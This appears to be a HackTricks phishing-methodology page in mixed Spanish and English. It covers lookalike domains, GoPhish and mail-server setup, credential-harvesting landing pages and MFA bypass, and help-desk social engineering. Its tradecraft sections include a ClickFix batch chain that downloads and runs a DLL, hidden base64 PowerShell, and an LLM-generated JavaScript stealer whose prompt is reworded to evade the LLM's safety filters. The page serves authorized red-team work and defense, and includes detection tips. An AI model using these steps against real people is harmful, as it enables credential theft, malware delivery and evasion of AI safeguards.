# Metodología de Phishing

{{#include ../../banners/hacktricks-training.md}}

## Metodología

1. Recon al victim
1. Select the **victim domain**.
2. Perform some basic web enumeration **searching for login portals** used by the victim and **decide** which one you will **impersonate**.
3. Use some **OSINT** to **find emails**.
2. Prepare the environment
1. **Buy the domain** you are going to use for the phishing assessment
2. **Configure the email service** related records (SPF, DMARC, DKIM, rDNS)
3. Configure the VPS with **gophish**
3. Prepare the campaign
1. Prepare the **email template**
2. Prepare the **web page** to steal the credentials
4. Launch the campaign!

## Generate similar domain names or buy a trusted domain

### Domain Name Variation Techniques

- **Keyword**: The domain name **contains** an important **keyword** of the original domain (e.g., zelster.com-management.com).
- **hypened subdomain**: Change the **dot for a hyphen** of a subdomain (e.g., www-zelster.com).
- **New TLD**: Same domain using a **new TLD** (e.g., zelster.org)
- **Homoglyph**: It **replaces** a letter in the domain name with **letters that look similar** (e.g., zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** It **swaps two letters** within the domain name (e.g., zelsetr.com).
- **Singularization/Pluralization**: Adds or removes “s” at the end of the domain name (e.g., zeltsers.com).
- **Omission**: It **removes one** of the letters from the domain name (e.g., zelser.com).
- **Repetition:** It **repeats one** of the letters in the domain name (e.g., zeltsser.com).
- **Replacement**: Like homoglyph but less stealthy. It replaces one of the letters in the domain name, perhaps with a letter in proximity of the original letter on the keyboard (e.g, zektser.com).
- **Subdomained**: Introduce a **dot** inside the domain name (e.g., ze.lster.com).
- **Insertion**: It **inserts a letter** into the domain name (e.g., zerltser.com).
- **Missing dot**: Append the TLD to the domain name. (e.g., zelstercom.com)

**Automatic Tools**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Websites**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

There is a **possibility that one of some bits stored or in communication might get automatically flipped** due to various factors like solar flares, cosmic rays, or hardware errors.

When this concept is **applied to DNS requests**, it is possible that the **domain received by the DNS server** is not the same as the domain initially requested.

For example, a single bit modification in the domain "windows.com" can change it to "windnws.com."

Attackers may **take advantage of this by registering multiple bit-flipping domains** that are similar to the victim's domain. Their intention is to redirect legitimate users to their own infrastructure.

For more information read [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)

### Buy a trusted domain

You can search in [https://www.expireddomains.net/](https://www.expireddomains.net) for a expired domain that you could use.\
In order to make sure that the expired domain that you are going to buy **has already a good SEO** you could search how is it categorized in:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Discovering Emails

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% free)
- [https://phonebook.cz/](https://phonebook.cz) (100% free)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

In order to **discover more** valid email addresses or **verify the ones** you have already discovered you can check if you can brute-force them smtp servers of the victim. [Learn how to verify/discover email address here](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Moreover, don't forget that if the users use **any web portal to access their mails**, you can check if it's vulnerable to **username brute force**, and exploit the vulnerability if possible.

## Configuring GoPhish

### Installation

You can download it from [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

Download and decompress it inside `/opt/gophish` and execute `/opt/gophish/gophish`\
You will be given a password for the admin user in port 3333 in the output. Therefore, access that port and use those credentials to change the admin password. You may need to tunnel that port to local:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### Configuration

**Configuración del certificado TLS**

Antes de este paso ya deberías haber **comprado el dominio** que vas a usar y debe estar **apuntando** a la **IP del VPS** donde estás configurando **gophish**.
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**Configuración del correo**

Empieza instalando: `apt-get install postfix`

Luego añade el dominio a los siguientes archivos:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Cambia también los valores de las siguientes variables dentro de /etc/postfix/main.cf**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Finalmente modifica los archivos **`/etc/hostname`** y **`/etc/mailname`** con el nombre de tu dominio y **reinicia tu VPS.**

Ahora, crea un **registro DNS A** de `mail.<domain>` apuntando a la **dirección IP** de la VPS y un **registro DNS MX** apuntando a `mail.<domain>`

Ahora vamos a probar a enviar un correo electrónico:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Configuración de Gophish**

Detén la ejecución de gophish y vamos a configurarlo.\
Modifica `/opt/gophish/config.json` con lo siguiente (nótese el uso de https):
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**Configurar el servicio gophish**

Para crear el servicio gophish para que pueda iniciarse automáticamente y gestionarse como un servicio, puedes crear el archivo `/etc/init.d/gophish` con el siguiente contenido:
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
Finaliza la configuración del servicio y compruébalo haciendo:
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## Configurando servidor de correo y dominio

### Espera y sé legítimo

Cuanto más antiguo sea un dominio, menos probable es que sea detectado como spam. Entonces deberías esperar todo el tiempo posible (al menos 1 semana) antes de la evaluación de phishing. además, si pones una página sobre un sector reputacional, la reputación obtenida será mejor.

Ten en cuenta que, incluso si tienes que esperar una semana, puedes terminar de configurar todo ahora.

### Configura el registro Reverse DNS (rDNS)

Establece un registro rDNS (PTR) que resuelva la dirección IP de la VPS al nombre de dominio.

### Sender Policy Framework (SPF) Record

Debes **configurar un registro SPF para el nuevo dominio**. Si no sabes qué es un registro SPF [**lee esta página**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

Puedes usar [https://www.spfwizard.net/](https://www.spfwizard.net) para generar tu política SPF (usa la IP de la máquina VPS)

![SPF Wizard form for generating an SPF record for a phishing domain](<../../images/image (1037).png>)

Este es el contenido que debe configurarse dentro de un registro TXT dentro del dominio:
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### Domain-based Message Authentication, Reporting & Conformance (DMARC) Record

Debes **configurar un registro DMARC para el nuevo dominio**. Si no sabes qué es un registro DMARC, [**lee esta página**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Tienes que crear un nuevo registro DNS TXT apuntando al hostname `_dmarc.<domain>` con el siguiente contenido:
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

Debes **configurar un DKIM para el nuevo dominio**. Si no sabes qué es un registro DMARC [**lee esta página**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

Este tutorial está basado en: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)

> [!TIP]
> Necesitas concatenar ambos valores B64 que genera la clave DKIM:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Prueba la puntuación de tu configuración de correo

Puedes hacerlo usando [https://www.mail-tester.com/](https://www.mail-tester.com)\
Solo accede a la página y envía un correo a la dirección que te dan:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
También puedes **comprobar tu configuración de email** enviando un email a `check-auth@verifier.port25.com` y **leyendo la respuesta** (para esto necesitarás **abrir** el puerto **25** y ver la respuesta en el archivo _/var/mail/root_ si envías el email como root).\
Comprueba que pasas todas las pruebas:
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
También podrías enviar **un mensaje a un Gmail bajo tu control**, y revisar los **encabezados del correo** en tu bandeja de entrada de Gmail; `dkim=pass` debería aparecer en el campo de encabezado `Authentication-Results`.
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### ​Removing from Spamhouse Blacklist

The page [www.mail-tester.com](https://www.mail-tester.com) can indicate if your domain is being blocked by spamhouse. You can request your domain/IP to be removed at: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Removing from Microsoft Blacklist

​​You can request your domain/IP to be removed at [https://sender.office.com/](https://sender.office.com).

## Create & Launch GoPhish Campaign

### Sending Profile

- Set some **nombre para identificar** el perfil del sender
- Decide from which account are you going to send the phishing emails. Suggestions: _noreply, support, servicedesk, salesforce..._
- You can leave blank the username and password, but make sure to check the Ignore Certificate Errors

![Create & Launch GoPhish Campaign - Sending Profile: You can leave blank the username and password, but make sure to check the Ignore Certificate Errors](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> It's recommended to use the "**Send Test Email**" functionality to test that everything is working.\
> I would recommend to **send the test emails to 10min mails addresses** in order to avoid getting blacklisted making tests.

### Email Template

- Set some **nombre para identificar** la plantilla
- Then write a **subject** (nothing estrange, just something you could expect to read in a regular email)
- Make sure you have checked "**Add Tracking Image**"
- Write the **email template** (you can use variables like in the following example):
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
Note that **con el fin de aumentar la credibilidad del email**, se recomienda usar alguna firma de un email del cliente. Sugerencias:

- Envía un email a una **dirección inexistente** y comprueba si la respuesta tiene alguna firma.
- Busca **emails públicos** como info@ex.com o press@ex.com o public@ex.com y envíales un email y espera la respuesta.
- Intenta contactar con **algún email válido descubierto** y espera la respuesta

![Sending Profile - Email Template: Try to contact some valid discovered email and wait for the response](<../../images/image (80).png>)

> [!TIP]
> La Email Template también permite **adjuntar archivos para enviar**. Si también quisieras robar challenges NTLM usando algunos archivos/documentos especialmente preparados [lee esta página](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Landing Page

- Escribe un **nombre**
- **Escribe el código HTML** de la web. Ten en cuenta que puedes **importar** páginas web.
- Marca **Capture Submitted Data** y **Capture Passwords**
- Establece una **redirección**

![Email Template - Landing Page: Mark Capture Submitted Data and Capture Passwords](<../../images/image (826).png>)

> [!TIP]
> Normalmente tendrás que modificar el código HTML de la página y hacer algunas pruebas en local (quizá usando algún servidor Apache) **hasta que te gusten los resultados.** Luego, escribe ese código HTML en la caja.\
> Ten en cuenta que si necesitas **usar algunos recursos estáticos** para el HTML (quizá algunas páginas CSS y JS) puedes guardarlos en _**/opt/gophish/static/endpoint**_ y luego acceder a ellos desde _**/static/\<filename>**_

> [!TIP]
> Para la redirección podrías **redirigir a los usuarios a la página web principal legítima** de la víctima, o redirigirlos a _/static/migration.html_ por ejemplo, poner alguna **rueda giratoria (**[**https://loading.io/**](https://loading.io)**) durante 5 segundos y luego indicar que el proceso fue exitoso**.

### Users & Groups

- Establece un nombre
- **Importa los datos** (ten en cuenta que para usar la plantilla del ejemplo necesitas el nombre, apellido y dirección de email de cada usuario)

![Landing Page - Users & Groups: Import the data (note that in order to use the template for the example you need the firstname, last name and email address of each user)](<../../images/image (163).png>)

### Campaign

Finalmente, crea una campaign seleccionando un nombre, la email template, la landing page, la URL, el sending profile y el grupo. Ten en cuenta que la URL será el enlace enviado a las víctimas

Ten en cuenta que el **Sending Profile permite enviar un email de prueba para ver cómo se verá el email final de phishing**:

![Users & Groups - Campaign: Note that the Sending Profile allow to send a test email to see how will the final phishing email looks like](<../../images/image (192).png>)

> [!TIP]
> Recomendaría **enviar los emails de prueba a direcciones de 10min mails** para evitar que te incluyan en listas negras al hacer pruebas.

Una vez que todo esté listo, ¡simplemente lanza la campaign!

## Website Cloning

Si por alguna razón quieres clonar la web, consulta la siguiente página:


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

En algunas evaluaciones de phishing (principalmente para Red Teams) también querrás **enviar archivos que contengan algún tipo de backdoor** (quizá un C2 o quizá algo que dispare una autenticación).\
Consulta la siguiente página para ver algunos ejemplos:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

El ataque anterior es bastante ingenioso, ya que estás falsificando una web real y recogiendo la información introducida por el usuario. Desafortunadamente, si el usuario no introdujo la contraseña correcta o si la aplicación que falsificaste está configurada con 2FA, **esta información no te permitirá suplantar al usuario engañado**.

Aquí es donde herramientas como [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) y [**muraena**](https://github.com/muraenateam/muraena) son útiles. Esta herramienta te permitirá generar un ataque tipo MitM. Básicamente, el ataque funciona de la siguiente manera:

1. **Suplantas el login** del formulario de la web real.
2. El usuario **envía** sus **credenciales** a tu página falsa y la herramienta las envía a la web real, **comprobando si las credenciales funcionan**.
3. Si la cuenta está configurada con **2FA**, la página MitM lo pedirá y una vez que el **usuario lo introduzca** la herramienta lo enviará a la página web real.
4. Una vez que el usuario se autentique, tú (como atacante) habrás **capturado las credenciales, el 2FA, la cookie y cualquier información** de cada interacción mientras la herramienta está realizando un MitM.

### Via VNC

¿Qué pasa si en lugar de **enviar a la víctima a una página maliciosa** con el mismo aspecto que la original, la envías a una **sesión VNC con un navegador conectado a la página web real**? Podrás ver lo que hace, robar la contraseña, el MFA usado, las cookies...
Puedes hacer esto con [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC)

## Detecting the detection

Obviamente, una de las mejores formas de saber si te han descubierto es **buscar tu dominio dentro de blacklists**. Si aparece listado, de algún modo tu dominio fue detectado como sospechoso.\
Una forma fácil de comprobar si tu dominio aparece en alguna blacklist es usar [https://malwareworld.com/](https://malwareworld.com)

Sin embargo, hay otras formas de saber si la víctima está **buscando activamente actividad de phishing sospechosa en la wild** como se explica en:


{{#ref}}
detecting-phising.md
{{#endref}}

Puedes **comprar un dominio con un nombre muy similar** al dominio de la víctima **y/o generar un certificado** para un **subdomain** de un dominio controlado por ti **que contenga** la **keyword** del dominio de la víctima. Si la **víctima** realiza cualquier tipo de interacción **DNS o HTTP** con ellos, sabrás que **está buscando activamente** dominios sospechosos y tendrás que ser muy stealth.

### Evaluate the phishing

Usa [**Phishious** ](https://github.com/Rices/Phishious) para evaluar si tu email va a acabar en la carpeta de spam, si va a ser bloqueado o si va a tener éxito.

## High-Touch Identity Compromise (Help-Desk MFA Reset)

Los conjuntos de intrusión modernos cada vez más omiten por completo los señuelos por email y **apuntan directamente al flujo de trabajo del service-desk / identity-recovery** para derrotar MFA. El ataque es totalmente "living-off-the-land": una vez que el operador obtiene credenciales válidas, pivota con herramientas administrativas integradas; no hace falta malware.

### Attack flow
1. Recon del victim
* Recopila datos personales y corporativos de LinkedIn, filtraciones de datos, GitHub público, etc.
* Identifica identidades de alto valor (ejecutivos, IT, finanzas) y enumera el **proceso exacto del help-desk** para reset de contraseña / MFA.
2. Ingeniería social en tiempo real
* Llama, usa Teams o chat con el help-desk mientras te haces pasar por el objetivo (a menudo con **spoofed caller-ID** o **cloned voice**).
* Proporciona la PII recopilada previamente para pasar la verificación basada en conocimiento.
* Convence al agente para **resetear el MFA secret** o realizar un **SIM-swap** en un número móvil registrado.
3. Acciones inmediatas post-acceso (≤60 min en casos reales)
* Establece una foothold a través de cualquier portal web SSO.
* Enumera AD / AzureAD con herramientas integradas (sin dejar binaries):
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* Lateral movement con **WMI**, **PsExec**, o agentes legítimos de **RMM** ya autorizados en el entorno.

### Detection & Mitigation
* Trata la recuperación de identidad del help-desk como una **operación privilegiada**: exige step-up auth y aprobación del manager.
* Despliega reglas de **Identity Threat Detection & Response (ITDR)** / **UEBA** que alerten sobre:
* Cambio de método MFA + autenticación desde un nuevo dispositivo / geo.
* Elevación inmediata del mismo principal (user-→-admin).
* Graba las llamadas del help-desk y exige un **call-back a un número ya registrado** antes de cualquier reset.
* Implementa **Just-In-Time (JIT) / Privileged Access** para que las cuentas recién reseteadas no hereden automáticamente tokens de alto privilegio.

---

## At-Scale Deception – SEO Poisoning & “ClickFix” Campaigns
Los grupos commodity compensan el coste de las operaciones high-touch con ataques masivos que convierten **search engines y ad networks en el canal de entrega**.

1. **SEO poisoning / malvertising** empuja un resultado falso como `chromium-update[.]site` a la parte superior de los anuncios de búsqueda.
2. La víctima descarga un pequeño **first-stage loader** (a menudo JS/HTA/ISO). Ejemplos vistos por Unit 42:
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. El loader exfiltra cookies del navegador + credential DBs, luego descarga un **silent loader** que decide, *en realtime*, si desplegar:
* RAT (e.g. AsyncRAT, RustDesk)
* ransomware / wiper
* persistence component (registry Run key + scheduled task)

### Hardening tips
* Bloquea dominios recién registrados y aplica **Advanced DNS / URL Filtering** tanto en *search-ads* como en email.
* Restringe la instalación de software a paquetes MSI firmados / Store, deniega la ejecución de `HTA`, `ISO`, `VBS` por policy.
* Monitoriza procesos hijos de navegadores abriendo instaladores:
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* Busca LOLBins frecuentemente abusados por first-stage loaders (e.g. `regsvr32`, `curl`, `mshta`).

### ClickFix DLL delivery tradecraft (fake CERT update)
* Lure: advisory clonado de un CERT nacional con un botón **Update** que muestra instrucciones de “fix” paso a paso. Se les dice a las víctimas que ejecuten un batch que descarga una DLL y la ejecuta mediante `rundll32`.
* Cadena batch típica observada:
```cmd
echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
echo timeout /t 10
echo rundll32.exe "%TEMP%\notepad2.dll",notepad
```
* `Invoke-WebRequest` deja el payload en `%TEMP%`, una breve pausa oculta la latencia de red, luego `rundll32` llama al entrypoint exportado (`notepad`).
* La DLL hace beacon de la identidad del host y consulta C2 cada pocos minutos. El remote tasking llega como **base64-encoded PowerShell** ejecutado oculto y con policy bypass:
```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
```
* Esto conserva la flexibilidad de C2 (el servidor puede cambiar tareas sin actualizar la DLL) y oculta las ventanas de consola. Busca hijos de PowerShell de `rundll32.exe` usando `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression` juntos.
* Los defensores pueden buscar callbacks HTTP(S) del tipo `...page.php?tynor=<COMPUTER>sss<USER>` e intervalos de polling de 5 minutos después de cargar la DLL.

---

## AI-Enhanced Phishing Operations
Los atacantes ahora encadenan APIs de **LLM y voice-clone** para señuelos totalmente personalizados e interacción en tiempo real.

| Layer | Example use by threat actor |
|-------|-----------------------------|
|Automation|Generar y enviar >100 k emails / SMS con redacción aleatoria y tracking links.|
|Generative AI|Producir emails *one-off* que hagan referencia a M&A públicos, chistes internos de redes sociales; deep-fake de la voz del CEO en una estafa de callback.|
|Agentic AI|Registrar dominios de forma autónoma, rastrear inteligencia de código abierto, crear mails de siguiente etapa cuando una víctima hace click pero no envía credenciales.|

**Defence:**
• Añade **dynamic banners** que destaquen mensajes enviados desde automatización no confiable (mediante anomalías ARC/DKIM).
• Despliega **voice-biometric challenge phrases** para solicitudes telefónicas de alto riesgo.
• Simula continuamente señuelos generados por AI en programas de awareness: las plantillas estáticas ya son obsoletas.

See also – agentic browsing abuse for credential phishing:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

See also – AI agent abuse of local CLI tools and MCP (for secrets inventory and detection):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLM-assisted runtime assembly of phishing JavaScript (in-browser codegen)

Los atacantes pueden enviar HTML aparentemente benigno y **generar el stealer en runtime** pidiéndole a una **trusted LLM API** JavaScript, y luego ejecutándolo en el navegador (e.g., `eval` o `<script>` dinámico).

1. **Prompt-as-obfuscation:** codifica URLs de exfiltración / cadenas Base64 en el prompt; itera la redacción para evitar los filtros de seguridad y reducir las alucinaciones.
2. **Client-side API call:** al cargar, JS llama a un LLM público (Gemini/DeepSeek/etc.) o a un proxy CDN; en el HTML estático solo están el prompt/la llamada a la API.
3. **Assemble & exec:** concatena la respuesta y ejecútala (polymorphic por visita):
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** el código generado personaliza el señuelo (p. ej., analizando tokens de LogoKit) y envía las credenciales al endpoint oculto en el prompt.

**Rasgos de evasión**
- El tráfico llega a dominios LLM conocidos o a proxies CDN reputados; a veces mediante WebSockets a un backend.
- No hay payload estático; el JavaScript malicioso existe solo después del renderizado.
- Las generaciones no deterministas producen **stealers** únicos por sesión.

**Ideas de detección**
- Ejecuta sandboxes con JavaScript habilitado; marca **`eval` en tiempo de ejecución / creación dinámica de scripts procedentes de respuestas LLM**.
- Busca POSTs del front-end a APIs LLM seguidos inmediatamente por `eval`/`Function` sobre el texto devuelto.
- Genera alertas por dominios LLM no autorizados en el tráfico del cliente junto con posteriores POSTs de credenciales.

---

## Variante de MFA Fatigue / Push Bombing – Forced Reset
Además del push-bombing clásico, los operadores simplemente **fuerzan un nuevo registro MFA** durante la llamada al help-desk, anulando el token existente del usuario. Cualquier solicitud de inicio de sesión posterior parece legítima para la víctima.
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
Monitor para eventos de AzureAD/AWS/Okta donde **`deleteMFA` + `addMFA`** ocurran **en cuestión de minutos desde la misma IP**.



## Clipboard Hijacking / Pastejacking

Atacantes pueden copiar silenciosamente comandos maliciosos en el clipboard de la víctima desde una página web comprometida o typosquatted y luego engañar al usuario para que los pegue dentro de **Win + R**, **Win + X** o una terminal, ejecutando código arbitrario sin ninguna descarga ni archivo adjunto.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Malicious App Distribution (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### WhatsApp device-linking hijack via QR social engineering
* Una página señuelo (p. ej., un falso canal de ministerio/CERT) muestra un QR de WhatsApp Web/Desktop e instruye a la víctima para que lo escanee, agregando silenciosamente al atacante como un **linked device**.
* El atacante obtiene de inmediato visibilidad de chats/contactos hasta que la sesión se elimina. Las víctimas pueden ver más tarde una notificación de “new device linked”; los defensores pueden buscar eventos inesperados de enlace de dispositivo poco después de visitas a páginas QR no confiables.

### Mobile‑gated phishing to evade crawlers/sandboxes
Los operadores cada vez más bloquean sus flujos de phishing detrás de una comprobación simple de dispositivo para que los crawlers de escritorio nunca lleguen a las páginas finales. Un patrón común es un pequeño script que prueba si el DOM es compatible con touch y envía el resultado a un endpoint del servidor; los clientes no móviles reciben HTTP 500 (o una página en blanco), mientras que los usuarios móviles reciben el flujo completo.

Minimal client snippet (typical logic):
```html
<script src="/static/detect_device.js"></script>
```
`detect_device.js` lógica (simplificada):
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
Server behaviour often observed:
- Establece una cookie de sesión durante la primera carga.
- Acepta `POST /detect {"is_mobile":true|false}`.
- Devuelve 500 (o un placeholder) a los GET posteriores cuando `is_mobile=false`; sirve phishing solo si `true`.

Hunting and detection heuristics:
- consulta de urlscan: `filename:"detect_device.js" AND page.status:500`
- Telemetría web: secuencia de `GET /static/detect_device.js` → `POST /detect` → HTTP 500 para non‑mobile; las rutas legítimas de víctimas mobile devuelven 200 con HTML/JS de seguimiento.
- Bloquea o examina páginas que condicionen el contenido exclusivamente en `ontouchstart` o comprobaciones de device similares.

Defence tips:
- Ejecuta crawlers con fingerprints similares a mobile y JS habilitado para revelar contenido restringido.
- Activa alertas por respuestas 500 sospechosas tras `POST /detect` en dominios recién registrados.

## References

- [https://zeltser.com/domain-name-variations-in-phishing/](https://zeltser.com/domain-name-variations-in-phishing/)
- [https://0xpatrik.com/phishing-domains/](https://0xpatrik.com/phishing-domains/)
- [https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [2025 Unit 42 Global Incident Response Report – Social Engineering Edition](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [Silent Smishing – mobile-gated phishing infra and heuristics (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [The Next Frontier of Runtime Assembly Attacks: Leveraging LLMs to Generate Phishing JavaScript in Real Time](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [Love? Actually: Fake dating app used as lure in targeted spyware campaign in Pakistan](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [ESET GhostChat IoCs and samples](https://github.com/eset/malware-ioc/tree/master/ghostchat)

{{#include ../../banners/hacktricks-training.md}}
